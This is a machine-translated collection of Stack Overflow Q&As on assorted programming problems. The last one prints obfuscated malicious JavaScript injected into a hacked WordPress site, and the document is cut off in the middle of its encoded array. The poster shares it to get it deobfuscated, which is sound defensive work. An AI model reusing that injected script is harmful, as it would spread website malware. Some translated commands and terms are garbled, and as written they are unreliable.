通过 Magento 默认主题附带的单页结帐，该过程挂在计费信息步骤上。它显示“处理” gif，但随后返回继续按钮，就像表单无效一样。

现在这是棘手的部分：magento 报告零错误。Firebug 没有报告任何 javascript 错误。我在尝试之前清理`/var/report/`并清空了所有文件`/var/log/`，并且在触发问题两三次之后`/var/report/`仍然是空的并且`/var/log/`仍然是空白。

当它发生时，firebug 中不会出现任何 javascript/ajax 错误，也不会留下任何错误报告——没有任何迹象表明有任何问题，除了它不工作。

有谁知道发生了什么？或者有人知道诊断这个的另一个技巧吗？

对于任何感兴趣的人，该商店位于[http://www.seacadetshipsstore.com/magento/](http://www.seacadetshipsstore.com/magento/)。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T23:16:35.010

这是你的错误

> 致命错误：Mage_Usa_Model_Shipping_Carrier_Usps 类包含 1 个抽象方法，因此必须声明为抽象方法或实现 /.../scss/magento/app/code/core/Mage/Usa/Model/Shipping/ 中的剩余方法 (Mage_Usa_Model_Shipping_Carrier_Abstract::_doShipmentRequest)第 37 行的运营商/Usps.php

请参见[1 个抽象方法，因此必须声明为抽象方法或实现其余方法](https://stackoverflow.com/questions/10663905/1-abstract-method-and-must-therefore-be-declared-abstract-or-implement-the-remai)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T23:59:45.013

根据[RS 的](https://stackoverflow.com/a/14348720/1191288)反馈，我发现问题出在 1.7 版本的 /code/core/Mage/Usa/Model/Shipping/Carrier/Usps.php 中。

将此添加到文件底部（第 920 行）修复它：

`public function _doShipmentRequest(Varien_Object $request){ }`

希望这可以帮助任何有同样问题的人！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-22T17:14:52.507

相同的问题，但不同的解决方案（将 CodeMoose 的 _DoShipmentRequest 添加到 Usps.php 的底线（在我的情况下为第 1700 行）导致 Magento 抛出错误）。

在通过禁用运输配置中的运输选项来隔离问题时，我在保存更改时在管理员中遇到了一个奇怪的“未定义常量 MCRYPT_BLOWFISH”错误。

这个错误的根源是没有安装 php5-mcrypt。它最近被 Apt 标记为不再使用，Apt 不断请求我用 'apt-get autoremove' 删除它:)

重新安装 php5-mcrypt 后，问题消失了，并且再次能够正常结帐。

# mysql - 如何使用 MySQL 命令行工具执行 SQL 文件？

> ID：14348045
> 
> 赞同：2
> 
> 时间：2013-01-15T22:24:52.803
> 
> 标签：mysql, sql, command-prompt

我正在使用 symfony、putty 和其他 SQL 命令似乎工作正常，但是当我尝试运行一个`.sql`文件（其中有很多）时，命令行会抛出一个错误：

```
You have an error in your SQL syntax; check the manual ... 
```

这是我要执行的命令：

```
mysql < data/MySQLFile.sql; 
```

我已经`use`在正确的数据库上使用了该命令，并尝试使用完整路径、相对路径等。不确定问题出在哪里。

这是声明：

```
ALTER TABLE tablename
    ADD COLUMN `blahblah` varchar(10) NULL;
ALTER TABLE tablename
    ADD COLUMN `ggggggg` varchar(50) NULL; 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2015-12-14T09:38:07.143

如果你想通过命令行执行

`mysql -u user -p < file.sql`

如果您想在登录到 mysql 数据库后执行。使用以下任何命令。

```
source file.sql 
```

或者

`\. file.sql`

或者

```
mysql db_name <file.sql 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-07-22T16:27:19.283

好的，如果您在mysql界面中已经输入：

```
\. /full path/to/file.sql 
```

我所说的完整路径是您需要根据当前操作系统文件系统指定文件的位置。仅仅通过放置 data/ 是不够的。例如，如果您使用的是 MAC OS，它将是： 从终端并假设在文档中：

```
mysql < /Users/<yourusername>/Documents/file.sql 
```

如果您已经登录 mysql，请输入：

```
\. /Users/<yourusername>/Documents/file.sql 
```

如果我的提示对您没有帮助，我会建议您转到此页面：

[http://dev.mysql.com/doc/refman/5.0/en/mysql-batch-commands.html](http://dev.mysql.com/doc/refman/5.0/en/mysql-batch-commands.html) 了解更多相关信息。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-03-01T23:23:48.810

我认为您只需要在 sql 文件的路径之前键入“源”即可。所以你会有

```
mysql < source [fullpath]/MySQLFile.sql; 
```

# c++ - 文件名是右键菜单中的 c++ 输入

> ID：14348047
> 
> 赞同：-1
> 
> 时间：2013-01-15T22:25:06.177
> 
> 标签：c++, windows, windows-8, windows-xp

我正在尝试使用 c++ 编写一个程序，当您选择一个文件并且当用户单击它时，该程序会在右键菜单中添加一个链接，该程序将打开并且我希望输入是文件名。例如，我的桌面上有 text.cpp，我右键单击它，然后有一个名为“识别此文件”的选项，然后当用户选择程序将启动时。我也想将文件名作为变量自动输入，例如 Sfilename 值将变为 test.cpp！

我不是专业人士，请用简单的语言解释，因为我搜索了很多，但我发现的只是一堆我不明白的解释。

我的操作系统是 WINdows 8，我想让它只在 Windows 上工作！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-15T23:32:13.430

要将您的应用程序添加到使用特定文件扩展名的文件的弹出菜单中，您可以执行以下操作：

1.  打开/创建以下注册表项：

    ```
    <root>\Software\Classes\<ext> 
    ```

    如果您希望菜单项仅显示给主叫用户，并且如果您希望它显示给所有用户，并且是所需的文件扩展名（在本例中为），`<root>`则在哪里。`HKEY_CURRENT_USER``HKEY_LOCAL_MACHINE``<ext>``.cpp`

2.  读取`(Default)`值。如果它不存在，请将其设置为您选择的值。

3.  打开/创建以下注册表项：

    ```
    <root>\Software\Classes\<progid>\Shell\<verb> 
    ```

    `<progid>`第 2 步中读取的值在哪里，并且`<verb>`是您为应用选择的唯一值，例如：`OpenWithMyApp`.

4.  将其`(Default)`值设置为菜单项功能的描述，例如：`Open with my app`.

5.  创建以下注册表项：

    ```
    <root>\Software\Classes\<progid>\Shell\<verb>\command 
    ```

6.  将其`(Default)`值设置为您要执行的完整路径和命令行，其中`%1`放置您希望所选文件出现的位置，例如：`"c:\path to\myapp.exe" "%1"`

因此，例如，它看起来像这样的结构：

```
HKEY_CURRENT_USER
  Software
    Classes
      .cpp
        (Default) = "CppFile"
      CppFile
        Shell
          OpenWithMyApp
            (Default) = "Open with my app"
            command
              (Default) = ""c:\path to\myapp.exe" "%1"" 
```

有关详细信息，请参阅 MSDN：

[文件类型](http://msdn.microsoft.com/en-us/library/cc144148.aspx)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-15T22:58:38.897

这不是一个初学者主题，您的问题的措辞向我表明您刚刚开始使用 Windows 编程。MSDN 上有[一个起点](http://msdn.microsoft.com/en-us/library/cc144169%28v=vs.85%29.aspx)可以帮助您。你不能只用谷歌搜索代码，你必须了解 Windows 是如何工作的。具体来说，您必须了解 Shell，它是 Windows 部件的名称，它使事情按照他们的方式工作。当有人双击 .docx 文件并加载 Word 时，这是因为 Word 将自己注册为该扩展名的处理程序。当有人右键单击任何文件并出现“添加到 zip 文件”（或类似内容）时，那是因为 WinZip 已向 Shell 注册以添加该动词。你需要掌握这些东西是什么：

*   贝壳
*   文件扩展名（不仅仅是“点后的字母”，而是一堆注册表项等，将点后的字母与应用程序相关联）
*   扩展的注册处理程序
*   动词（用于外壳）

从我给您的 MSDN 主题页面链接的文章将教您需要了解的内容。但这并不简单。即使只知道这些词也会帮助您进行搜索。还有[一些可用的示例](http://code.msdn.microsoft.com/site/search?query=shell%20verb&f%5B0%5D.Value=shell%20verb&f%5B0%5D.Type=SearchText&ac=8)，但不要尝试从这些示例开始：先阅读背景。

# c - 对二进制文件进行排序

> ID：14348050
> 
> 赞同：1
> 
> 时间：2013-01-15T22:25:22.137
> 
> 标签：c, sorting

我需要使用外部排序对二进制文件进行排序。我使用 2 个辅助文件 f1 和 f2 放置单调的序列数据。之后我合并这些文件。我这样做直到有一个单调的序列。

前 1 2 3 4 5 0 1

f1：1 2 3 4 5 f2：0 1

最终文件 0 1 1 2 3 4 5

我需要一些提示

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T22:58:30.257

1.  读取文件`f1`并`f2`放入数组`a1`和`a2`.
2.  排序数组`a1`和`a2`.
3.  逐个元素遍历两个数组，将每个数组中的最低元素添加到输出数组。添加元素时，增加该数组的“walk-index”。
4.  将输出数组打印到文件。

# perforce - 如何使用 p4v 更新 Perforce 架子上的文件？

> ID：14348053
> 
> 赞同：1
> 
> 时间：2013-01-15T22:25:33.413
> 
> 标签：perforce

一个文件（打开编辑）已经在架子上，然后我做了更多的本地更改，并想更新架子上的文件。通过 GUI P4v 执行此操作的最佳方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T22:31:26.817

再次搁置变更列表可以实现目标。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-09T16:39:45.467

p4 搁置 -c -f

将强制更新整个变更列表。这将覆盖文件的先前版本。

# jquery - 检测 jQuery 是否已经有一个正在运行的实例

> ID：14348057
> 
> 赞同：1
> 
> 时间：2013-01-15T22:25:59.573
> 
> 标签：jquery

我正在制作一个需要 jQuery X 版本的脚本。比方说1.7.1。

脚本将包含在其他系统中，例如 include('script-main.php'); 作为插件。我只会告诉我的客户复制/粘贴它，因为我无法直接访问他们的服务器。它将在 eBay 等网站上出售。

我需要知道他们是否已经在标题或其他版本中加载了 jQuery 1.4。

那么，我怎样才能进行这样的检查呢？（在伪代码中）

```
if(jQuery->isLoaded())
{
     if(jQuery->getVersion() > 1.7)
     {
         //do my task
     }
     else
     {
         //include 1.7 but don't mess up already installed 1.4!
         //If they already have some jQuery coded in that page, it shouldn't break them - neither touch
     }
}
else
{
     jQuery->load(); //load 1.7.1 via googleapis
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T22:27:55.380

你可以这样做：

```
if (typeof jQuery == 'undefined') {
  // jQuery is not loaded  
} 
else 
{ 
  // jQuery is loaded
  var version = $().jquery;
  // Ex: "1.4.1"
} 
```

# r - R-project 错误消息 - 无法读取表

> ID：14348059
> 
> 赞同：2
> 
> 时间：2013-01-15T22:26:06.017
> 
> 标签：r, function

我正在努力学习 R 教程。

目标是创建一个必须： 1) 将工作目录设置为我桌面上包含大量 .csv 文件的文件夹。2）取一个参数来标识要使用/加载哪个文件。2b) 参数必须制成特定格式。调用该函数的人可以输入一个长度在 1 到 3 位之间的数字）。有几百个潜在文件要加载，它们必须以“001.csv”、“050.csv”和“200.csv”格式输出。3) 加载输入文件的数据。

这是我的代码：

```
getmonitor <- function(id){

setwd("C:/Users/myname/Desktop/specdata") #set the directory

csvfile <- function(id) # set the file number format
    if (id < 10) { 
        paste0(0,0,id,".csv")
    } else if (id < 100) {
        paste0(0,id,".csv")
    } else paste0(id,".csv")
}

foo <-read.csv(csvfile) #load the appropriate csv file

} 
```

好吧，那没有用。我收到的错误消息是：“read.table 中的错误（file = file，header = header，sep = sep，quote = quote，：'file' 必须是字符串或连接”

我已经做了相当多的谷歌搜索，但无法理解如何解决这个问题。我的方法好吗？我是 R 和一般编程的新手。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T22:31:37.567

您将函数`csvfile`作为文件参数传递，而不是该函数在调用时返回的字符串。你要

```
foo <- read.csv(csvfile(id)) 
```

# android - 在一个屏幕中打开应用程序，然后动画到另一个屏幕

> ID：14348061
> 
> 赞同：0
> 
> 时间：2013-01-15T22:26:13.787
> 
> 标签：android, android-animation

我最近对 ​​android 开发很感兴趣。

我想做的是，一旦打开应用程序；将出现一个带有徽标的屏幕，按住一秒钟，然后向左移动到另一个屏幕。

我设计了布局。我将如何为那些 2 设置动画？java部分是我不太知道从哪里开始的地方。

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T14:14:13.240

对于那些好奇并想要相同的人 - 让启动页面挂起几秒钟，然后滑到一个活动。

这就是我实现代码的方式。我从其他用户那里发现了这个，所以我不能把它归功于它，但我认为这对于可能偶然发现这个的人来说会很好。

```
public class logoSplash extends Activity {
private static final int SPLASH_DISPLAY_TIME = 2000; // splash screen delay time

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.logo);

        new Handler().postDelayed(new Runnable() {
            public void run() {

            Intent intent = new Intent();
            intent.setClass(logoSplash.this, fieldsActivity.class);

            logoSplash.this.startActivity(intent);
            logoSplash.this.finish();

            // transition from splash to main menu
            overridePendingTransition(R.anim.right_slide_in, R.anim.right_slide_out);

            }
        }, SPLASH_DISPLAY_TIME);
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T23:37:21.197

当您启动意图时，`overridePendingTransition(android.R.anim.slide_out_right, android.R.anim.slide_in_left);`如果这不是效果，您可以将动画更改为其他动画`android.R.anim`或在 XML 中定义您自己的动画，而是指向您的动画文件夹`R.anim`

这是自定义动画的示例，您可以将其保存在 res/anim/

```
<?xml version="1.0" encoding="utf-8"?>
<set xmlns:android="http://schemas.android.com/apk/res/android">
    <translate android:fromXDelta="0" android:toXDelta="-50%p"
        android:duration="@android:integer/config_shortAnimTime"/>
    <alpha android:fromAlpha="1.0" android:toAlpha="0.0"
        android:duration="@android:integer/config_shortAnimTime" />
</set> 
```

# windows - 构建依赖于其他两个 DLL 的 DLL 的错误

> ID：14348063
> 
> 赞同：0
> 
> 时间：2013-01-15T22:26:15.080
> 
> 标签：windows, visual-c++, dll, java-native-interface

### 背景

我正在尝试构建一个通过 JNI 使用现有本机库的 Java 程序。本机项目有两个组件，每个组件都构建一个共享库：

1.  构建`core.lib`和构建的核心组件`core.dll`
2.  一个依赖于核心组件的应用程序组件，并构建`application.lib`和`application.dll`

使用 SWIG，我创建了一个`application_wrap.c`文件和相应的 Java 文件，以便我可以使用 JNI 访问本机库。

我想做的是构建一个`application_jni.dll`包含这个`application_wrap.c`文件的新共享库（让我们称之为），这样我就可以像这样在我的 Java 程序中加载它：

```
System.loadLibrary("application_jni"); 
```

### 问题

不幸的是，我似乎无法弄清楚如何使用 Visual Studio 编译器在 Windows 上执行此操作。这是我尝试过的：

首先，编译`application_wrap.c`SWIG 生成的文件。这会产生`application_wrap.obj`，并且似乎工作得很好。

```
cl /I "path/to/core/headers" /I "path/to/application/headers" -c application_wrap.c 
```

接下来，链接`application_wrap.obj`现有的共享库以创建一个新的共享库：

```
link /dll /out:application_jni.dll application_wrap.obj core.lib application.lib 
```

这会导致大量错误，如下所示：

```
application_wrap.obj : error LNK2019: unresolved external symbol __imp__function_in_core referenced in function_in_application_wrap 
```

知道什么可能导致这些错误吗？我没有太多在 Windows 上编译的经验，所以如果我发现我在编译或链接阶段遗漏了一些标志（甚至误解了 dll 的工作方式），我一点也不感到惊讶。

### 一些额外的说明

跑步

```
dumpbin /exports core.lib 
```

表明错误消息中提到的所有功能实际上都是由核心共享库导出的。

### 编辑

在 Pavel 的建议下，我编写了一个简单的 C 程序来查看它是否会链接。我使用了与上面相同的编译和链接命令，但遇到了同样的错误。

C程序`test.c`：

```
#include "application.h"

int main() {
  function_in_application();
} 
```

错误：

```
test.obj : error LNK2019: unresolved external symbol __imp__function_in_application referenced in function _main 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T16:23:57.087

库链接失败，因为`core.dll`它们`application.dll`是为 64 位编译的，默认目标`cl.exe`是 32 位。链接器失败是因为我试图将一个 32 位`obj`文件链接到两个 64 位文件`dll's`。为 64 位编译所有内容解决了这个问题。

### 需要注意的几件事

*   如果您安装了 64 位编译器，您可以`cl.exe`通过运行`vcvarsall.bat`带有与您的目标平台相对应的参数（例如“amd64”）的脚本来生成目标 64 位。可以在[此处](http://msdn.microsoft.com/en-us/library/x4d2c09s.aspx)找到更深入的说明。
*   默认版本默认`Visual Studio Express 2010`不安装 64 位编译器。您可能需要`setup.exe`再次运行并检查适当的自定义安装选项来安装它们。
*   的默认版本`Visual Studio Express 2012`带有 64 位编译器。我卸载了2010版本，安装了2012，之后就没有问题了。

# google-app-engine - 为什么同一实体组中不隐含相同类型的实体

> ID：14348065
> 
> 赞同：1
> 
> 时间：2013-01-15T22:26:22.410
> 
> 标签：google-app-engine, transactions, google-cloud-datastore, batch-processing

当它们没有父实体（它们是根实体）时，为什么相同类型的实体不隐含在同一个实体组中？这是否意味着如果我想做例如将数据从 MySQL 写入 HRD 的批处理操作：

```
db.put([Person(name=person.name) for person in cursor.execute("SELECT * FROM person")]) 
```

出于这个原因，我必须使用事务：

> 注意：对于某些实体，对 db.put() 或 db.delete() 的批量调用可能会成功，但对于其他实体则不会。如果调用完全成功或完全失败很重要，则必须使用事务，并且所有受影响的实体必须在同一个实体组中。

来源：[https ://developers.google.com/appengine/docs/python/datastore/entities#Batch_Operations](https://developers.google.com/appengine/docs/python/datastore/entities#Batch_Operations)

我需要创建一个公共根父密钥，它不作为真实实体存在，仅用于交易目的？

```
parent_key = db.Key.from_path('Human', 'human')
db.put([Person(parent=parent_key, name=person.name) for person in cursor.execute("SELECT * FROM person")]) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-16T03:59:23.850

同类实体并不隐含在同一个实体组中，因为它通常会给大多数用例带来糟糕的性能。

虽然不完全准确，但您可以将实体组视为控制分片的一种方式。同一组中的实体存储在物理上非常接近（即在同一服务器上），允许对所有实体进行事务操作，但也限制了该实体组的性能。实体组内的父关系不限于种类，父实体不必与子实体属于同一种类。

大多数时候，实体组将包含各种不同类型的实体，它们在逻辑上属于一起，因为事务往往基于组。例如，一个 Account 可能是一堆 Transactions 的父级，或者一个 BlogPost 可能是一堆 Comments 的父级。

将一个 Kind 的所有实体放在同一个父级下会阻止它们被正确地设置为其他操作的父级，而这些操作确实需要在事务中进行。

在您的情况下，最好不要在事务中运行操作，并有额外的代码来处理失败情况。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T23:59:10.387

不，kind 和 parent 是密钥的两个不同部分。完整键实际上由应用程序 id（隐式设置）、命名空间 id、父键（根的所有父键）和名称或 id 组成。

如果省略父实体，则实体是实体组的根，并且是该实体组中的唯一实体。

在您的情况下，一批`Person`实体不会组成一个实体组，而是每个实体`Person`（从事务的角度来看）都在其自己的实体组中。所以你的批量 put 不会是原子的。

注意：实体组是“让我们将所有这些实体放在同一台机器上”的花哨名称。

注 2：现在有新的[跨集团交易](https://developers.google.com/appengine/docs/python/datastore/overview#Cross_Group_Transactions)，使您能够跨 5 个不同的实体集团进行交易。

# android - 系统或签名保护级别

> ID：14348066
> 
> 赞同：2
> 
> 时间：2013-01-15T22:26:26.137
> 
> 标签：android, permissions

关于“systemOrSignature”保护级别似乎存在一些相互矛盾的信息。

如果我有一个由 OEM 包含在图像中的预安装系统应用程序，但由我签名，我的应用程序将具有此保护级别，对吗？这与需要 OEM 签名的“签名”保护级别不同。

如果是这样，我的申请会被授予此权限吗？android.permission.INSTALL_PACKAGES

默认情况下，这似乎设置为 systemOrSignature 级别保护，但 stackoverflow 上的大多数答案都表明需要 OEM 签名，例如：

[静默安装应用程序，并授予 INSTALL_PACKAGES 权限](https://stackoverflow.com/questions/5803999/install-apps-silently-with-granted-install-packages-permission)

[从 /system/app 以编程方式安装具有 INSTALL_PACKAGES 权限的应用程序时出现问题](https://stackoverflow.com/questions/8130677/troubles-installing-programmatically-an-app-with-install-packages-permission-fro)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T22:38:48.567

> 如果我有一个由 OEM 包含在图像中的预安装系统应用程序，但由我签名，我的应用程序将具有此保护级别，对吗？

这就是应该发生的事情。

> 如果是这样，我的申请会被授予此权限吗？android.permission.INSTALL_PACKAGES

根据[当前的源代码](https://github.com/android/platform_frameworks_base/blob/master/core/res/AndroidManifest.xml)，是的：

```
<permission android:name="android.permission.INSTALL_PACKAGES"
    android:label="@string/permlab_installPackages"
    android:description="@string/permdesc_installPackages"
    android:protectionLevel="signature|system" /> 
```

请记住，任何给定权限的规则都可能随着时间而改变。

> 默认情况下，这似乎设置为 systemOrSignature 级别保护，但 stackoverflow 上的大多数答案都表明需要 OEM 签名

您的第二个链接说安装在固件上就足够了，这与当前的源代码一致。

此外，有时对 SO 的回答和评论会使用一些速记。由于您可以通过查看源代码来判断您需要什么，因此您始终可以自己验证给定权限是否为`signature`-only。

# c# - 循环碰撞逻辑错误

> ID：14348067
> 
> 赞同：1
> 
> 时间：2013-01-15T22:26:27.023
> 
> 标签：c#, loops, for-loop

我有一个循环，应该检测并删除列表中与放置的对象相交的任何对象。代码如下：

```
for (int i = 0; i < levelObjects.Count(); i++)
{
    if (levelObjects[i].BoundingBox.Intersects(mouseBlock.BoundingBox))
    {
        levelObjects.RemoveAt(i);
    }
} 
```

当遇到有多个碰撞的情况时，它有时检测不到碰撞。交集功能工作正常。我的循环是怎么回事？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-15T22:29:20.237

由于您要从循环中删除，因此您最终会跳过元素。更好的选择是向后循环：

```
for (int i=levelObjects.Count() - 1; i >= 0; --i)
{
  // ... 
```

这可以防止您现在丢失的“跳过”对象，因为当您删除并且索引向下移动时，您只是在移动已经测试过的对象。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-15T22:29:10.363

当您删除 index 处的对象时， index`i`处的值会`i + 1`向下滑动到 index `i`。您的循环移动到 index `i + 1`，并且从不检查 index 处的新值`i`。您可以通过简单地向后循环来避免这种情况。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-01-15T22:30:07.363

当您删除索引 i 处的 levelObject 时，您会将所有内容向下移动一个索引。因此，下一项现在位于索引 i 处。避免这种情况的一个简单方法是从最后开始并向后工作，即

```
for (int i = levelObjectsCount - 1; i >= 0; i--)
{
    if (levelObjects[i].BoundingBox.Intersects(mouseBlock.BoundingBox))
    {
        levelObjects.RemoveAt(i);
    }
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-15T22:29:24.523

您不能从您正在迭代的列表中删除！遍历副本或创建要删除的项目列表，然后再删除它们。示例（如果性能不是问题）：

```
foreach (var obj in levelObjects.ToList())
{
    if (obj.BoundingBox.Intersects(mouseBlock.BoundingBox))
    {
        levelObjects.Remove(obj);
    }
} 
```

# css - 使用 CSS3 水平对齐 div

> ID：14348069
> 
> 赞同：1
> 
> 时间：2013-01-15T22:26:38.427
> 
> 标签：css, html, alignment

这是我的代码。我将这些 div 设为表格单元格

```
<div class="logo">
text
</div>

<div class="stats" >
text
</div> 
```

和我的 CSS

```
.logo
{
    display:table-cell;
    width:420px;
}

.stats
{
    display:table-cell;
    width:200px;
} 
```

是否可以在不使用浮点数的情况下以某种方式将第一个 div 向左对齐，第二个向右对齐？或者只是为了将其中的内容左右对齐？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T22:33:36.250

有比使用像 table-cell 这样晦涩的显示方法更简洁的方法来解决这个问题 - 通常您可以使用`block`、`inline`或`inline-block`. 你在做什么需要表格单元格？

话虽如此，您可以做一些事情。要在这些元素内对齐文本或内联内容，只需`text-align`-`left`或`right`. 如果您要嵌套 div，则可以应用类似`.logo *{ float: left; }`.

我不熟悉表格单元格显示的动态，但是如果您想在不使用浮动的情况下进行定位，通常您可以`position: absolute;`使用`left: 0px;`and `right: 0px;`。但是，这有其自身的一系列问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T23:10:51.777

另一方面，您可以使用带有浮动的填充来创建表格的伪效果，并且“填充 + 边距 + 约束 div”被证明是对我来说最好的对齐属性......虽然这可能无法解决您的“没有浮动“ 问题。

# android - 行断点：AndroidFacebookConnectActivity

> ID：14348074
> 
> 赞同：0
> 
> 时间：2013-01-15T22:26:40.323
> 
> 标签：android, facebook-graph-api

```
Multiple markers at this line
    - R cannot be resolved to a variable
    - Line breakpoint:AndroidFacebookConnectActivity [line: 45] - 
     onCreate(Bundle) 
```

在以下代码中的所有资源 id 都有问题，在这里我添加了 facebook sdk 并尝试运行导入的示例项目但显示上述错误

```
public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        btnFbLogin = (Button) findViewById(R.id.btn_fblogin);
        btnFbGetProfile = (Button) findViewById(R.id.btn_get_profile);
        btnPostToWall = (Button) findViewById(R.id.btn_fb_post_to_wall);
        btnShowAccessTokens = (Button) findViewById(R.id.btn_show_access_tokens);
        mAsyncRunner = new AsyncFacebookRunner(facebook); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-10-20T04:30:59.460

LineBreakpoint 消息不是错误：它是您在此处放置断点的通知。R 无法解析消息意味着您没有声明该变量。您可能希望这样做： `import android.support.v4.app.Fragment;`在页面顶部。

# symfony - 在 symfony2 上通过 AJAX 对用户进行身份验证？

> ID：14348076
> 
> 赞同：0
> 
> 时间：2013-01-15T22:26:43.267
> 
> 标签：symfony

我通过 ajax 调用这个脚本：

```
$userRepository = $this->getDoctrine( )->getRepository( 'DonePunctisBundle:User' );
$user           = $userRepository->findOneByUsername( array( 'username' => $fbuser['email'] ) );

$this->_authenticateUser($user);

protected function _authenticateUser( User $user )  {
    $token = new UsernamePasswordToken($user, null, 'main', $user->getRoles() );
    $this->get( 'security.context' )->setToken( $token );
} 
```

没有错误，但用户没有登录。我需要做什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T05:48:39.870

只需在 UsernamePasswordToken 中传递用户密码。

```
new UsernamePasswordToken($user, $user->getPassword(), 'main', $user->getRoles()); 
```

# javascript - 如何让我的 div 向下滑动 JQuery

> ID：14348078
> 
> 赞同：1
> 
> 时间：2013-01-15T22:26:50.663
> 
> 标签：javascript, jquery, html, css, slidedown

> **可能重复：**
> [jQuery - 如何在表格行上使用 slideDown（或显示）函数？](https://stackoverflow.com/questions/467336/jquery-how-to-use-slidedown-or-show-function-on-a-table-row)

我有这个页面结构：当鼠标悬停在表格单元格上时，表格单元格会展开，我想要的是在这个特定单元格之后向下滑动第一个 div。我从标签中制作了我的滑动 div，`<section>`因为我不希望它成为表格的一部分。

正如您在我的示例中看到的 slideDown 函数没有做任何事情，（可能是我犯了一些错误 =））所以这里是小提琴[http://jsfiddle.net/9FC9D/1/](http://jsfiddle.net/9FC9D/1/)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T23:36:59.557

您的 jsFiddle 有几个问题：

a) 没有应用 jQuery b) 您将悬停事件绑定到错误的元素（“.box”而不是“section”，并且“.box”是一个没有任何布局的空 div）。

看起来好像在悬停时发生了一些事情，但这来自 CSS 而不是 JS。我已经调整了您的小提琴（[http://jsfiddle.net/9FC9D/4/](http://jsfiddle.net/9FC9D/4/)），以便您的函数在悬停时执行（并将其更改为 slideToggle，否则您需要定义一个“in”函数和一个“out”功能 - 请参阅[http://api.jquery.com/hover/](http://api.jquery.com/hover/)了解更多信息）。

这是更新的 jQuery：

```
$(document).ready(function () {
    $("#wrapper section").hover(function() {
        $(this).next('.box-content').slideToggle(500);
    }); 
}); 
```

您的 CSS 仍然存在一些样式问题 - 仍然不能 100% 确定您想要实现的目标，但如果您提供有关所需效果的更多信息，我们很乐意就这些问题提出建议。

# javascript - 注入网站黑客的 javascript

> ID：14348080
> 
> 赞同：0
> 
> 时间：2013-01-15T22:26:59.680
> 
> 标签：javascript, deobfuscation

我的朋友 word press 网站遭到攻击，一堆 php 文件注入了一些 eval 语句，我已经对其进行了膨胀和解码​​，但它引导我进入了下面的 javascript。

任何人都知道如何去混淆它，以便我们可以阅读它所说的内容？

```
ww=window;v="v"+"al";if(ww.document)try{document.body=12;}catch(gdsgsdg){asd=0;try{d=document}catch(agdsg){asd=1;}if(!asd){w={a:ww}.a;v="e".concat(v);}}e=w[v];if(1){f=new Array(102,116,108,96,116,104,109,107,32,102,112,94,40,96,42,95,41,122,112,98,116,116,112,107,32,76,95,113,104,45,100,105,111,110,112,37,77,96,114,101,46,113,95,107,100,110,107,37,41,41,38,95,45,96,41,46,41,40,41,94,59,124,11,7,102,116,108,96,116,104,109,107,32,113,113,37,41,122,112,98,116,116,112,107,32,76,95,113,104,45,112,94,110,99,109,106,40,40,44,113,111,82,114,111,105,109,101,37,51,53,39,43,115,116,96,112,116,113,103,107,103,39,51,38,59,124,11,7,105,101,38,107,97,117,103,100,97,115,109,111,46,98,109,108,107,104,99,66,110,96,96,105,101,99,39,120,13,9,7,115,97,113,30,112,116,109,107,58,114,114,38,38,59,12,8,6,118,96,112,29,117,96,30,58,32,109,95,115,105,102,95,113,111,113,44,114,115,100,112,62,103,100,108,113,59,12,8,6,118,96,112,29,117,113,106,29,61,31,98,108,99,116,107,98,110,115,44,105,111,98,95,113,105,110,108,43,104,113,99,99,59,12,8,6,105,101,38,114,114,107,44,102,110,99,99,117,79,101,38,36,97,99,107,102,110,38,39,58,61,44,47,29,38,37,30,114,97,45,103,107,100,100,118,76,102,39,37,84,105,109,98,108,119,114,37,38,33,60,43,46,32,37,36,29,40,116,95,43,105,109,98,98,120,78,100,37,39,76,81,70,69,38,39,30,61,44,47,121,124,116,95,43,105,109,98,98,120,78,100,37,39,78,110,98,114,96,37,38,33,60,43,46,41,40,121,10,10,8,7,97,111,98,115,106,101,109,114,43,119,113,103,113,101,39,37,57,115,115,119,105,101,61,44,112,39,42,113,113,110,108,41,36,32,122,30,109,111,114,103,113,105,110,108,55,97,97,113,108,108,116,114,98,59,31,106,98,102,115,56,42,39,42,101,111,97,39,52,45,48,43,47,45,48,47,39,40,39,111,118,56,32,115,109,109,58,44,37,40,103,113,95,37,54,47,46,41,49,47,46,45,41,42,37,109,120,58,30,122,60,46,113,113,121,107,99,59,32,59,98,102,118,31,97,105,97,114,113,58,34,114,37,40,115,115,108,106,43,38,32,59,60,104,100,111,97,108,99,29,115,113,97,58,34,103,114,113,112,57,45,44,112,116,106,105,100,110,117,107,108,96,119,112,46,104,108,99,111,46,95,97,47,101,99,98,100,45,110,101,112,33,30,116,105,99,114,101,61,33,37,40,103,113,95,37,51,47,46,41,54,47,46,38,43,38,32,